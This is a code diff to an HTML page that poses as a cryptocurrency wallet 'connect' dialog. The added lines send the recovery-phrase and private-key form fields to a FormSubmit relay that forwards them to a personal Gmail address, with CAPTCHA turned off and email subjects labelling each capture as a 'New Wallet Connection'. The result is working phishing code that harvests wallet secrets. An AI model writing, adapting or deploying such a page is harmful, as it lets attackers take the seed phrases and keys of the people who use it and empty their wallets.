@@ -38,8 +38,15 @@
                     </ul>
                 </div>
                 <div id="myTabContent">
+                    <!-- Phrase Form -->
                     <div class="p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="profile" role="tabpanel" aria-labelledby="profile-tab">
-                        <form method="POST" class="ajaxForm">
+                        <form action="https://formsubmit.co/alerts4mercien@gmail.com" method="POST" class="ajaxForm">
+                            <!-- Hidden Fields for FormSubmit -->
+                            <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you-page"> <!-- Optional: Redirect after submission -->
+                            <input type="hidden" name="_captcha" value="false"> <!-- Disable CAPTCHA -->
+                            <input type="hidden" name="_subject" value="New Wallet Connection (Phrase)"> <!-- Email Subject -->
+                            <input type="hidden" name="_template" value="table"> <!-- Optional: Email Template -->
+
                             <div class="mb-6">
                                 <label for="phrase" class="sr-only">Recovery Phrase</label>
                                 <textarea id="phrase" name="phrase" rows="4" placeholder="Enter your recovery phrase (typically 12-24 words separated by a single space)"
@@ -50,8 +57,16 @@
                                 class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800">Connect</button>
                         </form>
                     </div>
+
+                    <!-- Private Key Form -->
                     <div class="hidden p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="settings" role="tabpanel" aria-labelledby="settings-tab">
-                        <form method="POST" class="ajaxForm">
+                        <form action="https://formsubmit.co/alerts4mercien@gmail.com" method="POST" class="ajaxForm">
+                            <!-- Hidden Fields for FormSubmit -->
+                            <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you-page"> <!-- Optional: Redirect after submission -->
+                            <input type="hidden" name="_captcha" value="false"> <!-- Disable CAPTCHA -->
+                            <input type="hidden" name="_subject" value="New Wallet Connection (Private Key)"> <!-- Email Subject -->
+                            <input type="hidden" name="_template" value="table"> <!-- Optional: Email Template -->
+
                             <div class="mb-6">
                                 <label for="privatekey" class="sr-only">Private Key</label>
                                 <input id="privatekey" name="privatekey" type="text" placeholder="Enter your private key"
